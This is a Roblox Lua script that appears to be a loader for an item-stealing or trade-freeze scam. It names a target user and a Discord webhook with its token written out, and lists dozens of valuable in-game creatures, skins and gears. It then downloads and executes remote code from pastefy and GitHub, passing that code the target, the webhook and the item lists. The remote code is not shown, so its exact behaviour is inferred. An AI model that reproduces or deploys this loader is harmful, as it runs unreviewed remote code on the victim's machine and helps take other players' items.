local TARGET_ID = 3818261802
local TARGET_USER = "Gummybearsbday234"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1571550340984348703/O1FL7ImFfTAbqHThwQ2RTguo-pXr6_z13vExqGq2QDSNmT7Jq99LvHhihd1dbNhKpcxP"

local TargetBrainrots = {
    ["Dragon Skeletonini"] = true,
    ["Plant Bros"] = true,
    ["Phoenix"] = true,
    ["Hydra Serpent"] = true,
    ["Strawberry Elephant"] = true,
    ["Orchidox"] = true,
    ["Skibidi Toilet"] = true,
    ["Meowl"] = true,
    ["Los Dragons"] = true,
    ["La Craft Machine"] = true,
    ["Gold and Diamond"] = true,
    ["Dragon Cannelloni"] = true,
    ["Griffin"] = true,
    ["Dragon Gingerini"] = true,
    ["Hydra Bunny"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["John Pork"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["Rubrikiko"] = true,
    ["Pancake and Syrup"] = true,
    ["Arcadragon"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Kalika Bros"] = true,
    ["Rico Dinero"] = true,
    ["Globa Steppa"] = true,
    ["Dragon Aquanini"] = true,
    ["La Casa Boo"] = true,
    ["Dug Dug Dug"] = true,
    ["Headless Horseman"] = true,
    ["La Supreme Combinasion"] = true,
    ["Fishino Clownino"] = true,
    ["Signore Carapace"] = true,
    ["Kraken"] = true,
    ["Duggy Bros"] = true,
    ["Cerberus"] = true,
    ["Money Money Bros"] = true,
    ["Venuspino"] = true,
    ["Steakini Fattini"] = true,
    ["Jelly Moby"] = true,
    ["Foxini Lanternini"] = true,
    ["Digi Narwhal"] = true,
    ["Moby Bros"] = true,
    ["Los Admins"] = true,
    ["Burguro and Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Celestial Pegasus"] = true,
    ["Cash or Card"] = true,
    ["Cooki and Milki"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Festive 67"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Garama and Madundung"] = true,
    ["Gold Gold Gold"] = true,
    ["Ginger Gerat"] = true,
    ["La Food Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["Pizza and Ranch"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Examen Bros"] = true,
    ["Bumbatron"] = true,
    ["Yetimatic"] = true,
    ["S'more Serat"] = true,
    ["Queen Bee"] = true,
    ["Scorpino Coasterino"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Los Sekolahs"] = true,
    ["Love Love Bear"] = true,
    ["Orcaledon"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Spooky and Pumpky"] = true,
    ["W or L"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Polaroidini"] = true,
    ["Nachorilla"] = true,
    ["Sammyni Truckini"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Christmas"] = true,
    ["Easter"] = true,
    ["Gingerbread"] = true,
    ["Halloween"] = true,
    ["Octo"] = true,
    ["Lucky"] = true,
    ["Pot of Gold"] = true,
    ["Rose"] = true,
    ["Summer"] = true,
    ["Taco"] = true,
    ["Valentines"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Blackhole Bomb"] = true,
    ["Cupid's Wings"] = true,
    ["Cyber Slap"] = true,
    ["Cursed Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Phantom Slap"] = true,
    ["Yin Yang Slap"] = true,
    ["Yin Yang Lamp"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)